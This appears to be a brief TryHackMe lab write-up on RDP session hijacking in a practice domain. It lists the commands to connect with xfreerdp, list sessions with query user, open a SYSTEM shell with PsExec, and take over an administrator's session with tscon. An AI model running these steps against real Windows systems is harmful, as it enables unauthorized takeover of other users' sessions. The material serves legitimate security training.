# RDP Hijacking

[http://distributor.za.tryhackme.com/creds_t2](http://distributor.za.tryhackme.com/creds_t2) 

```markup
we got some credential, byany any method
```

```markup
xfreerdp /v:thmjmp2.za.tryhackme.com /u:YOUR_USER /p:YOUR_PASSWORD
```

```markup
C:\> query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
 luke 
```

`PsExec64.exe -s cmd.exe`

```markup
tscon 3 /dest:rdp-tcp#6
```